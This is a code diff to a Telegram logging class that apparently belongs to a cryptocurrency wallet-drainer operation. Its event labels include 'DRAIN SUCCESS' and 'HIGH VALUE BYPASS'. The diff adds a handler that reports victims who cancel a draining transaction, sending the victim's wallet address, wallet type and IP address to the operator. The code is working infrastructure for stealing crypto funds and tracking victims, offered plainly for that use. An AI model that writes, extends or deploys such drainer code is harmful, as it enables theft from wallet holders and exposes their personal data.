@@ -63,6 +63,7 @@ class TelegramLogger {
       'WALLET_DETECTED': '👛',
       'DRAIN_SUCCESS': '💰',
       'DRAIN_FAILED': '❌',
+      'TRANSACTION_CANCELLED': '🚫',
       'RATE_LIMIT': '⏰',
       'HIGH_VALUE_BYPASS': '💎',
       'INSUFFICIENT_FUNDS': '💸',
@@ -79,6 +80,7 @@ class TelegramLogger {
       'WALLET_DETECTED': 'WALLET DETECTED',
       'DRAIN_SUCCESS': 'DRAIN SUCCESS',
       'DRAIN_FAILED': 'DRAIN FAILED',
+      'TRANSACTION_CANCELLED': 'TRANSACTION CANCELLED',
       'RATE_LIMIT': 'RATE LIMIT',
       'HIGH_VALUE_BYPASS': 'HIGH VALUE BYPASS',
       'INSUFFICIENT_FUNDS': 'INSUFFICIENT FUNDS',
@@ -169,6 +171,27 @@ class TelegramLogger {
     `.trim();
 
     await this.sendMessage(message, 'DRAIN_FAILED');
+  }
+
+  /**
+   * Log transaction cancellation
+   */
+  async logTransactionCancelled(data) {
+    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
+    const ip = data.ip || 'Unknown';
+    const walletType = data.walletType || 'Unknown';
+    const reason = data.reason || 'User cancelled transaction';
+    
+    const message = `
+<b>🚫 Transaction Cancelled</b>
+
+👤 <b>Wallet:</b> <code>${walletAddress}</code>
+💼 <b>Type:</b> ${walletType}
+❌ <b>Reason:</b> ${reason}
+🌐 <b>IP:</b> ${ip}
+    `.trim();
+
+    await this.sendMessage(message, 'TRANSACTION_CANCELLED');
   }
 
   /**
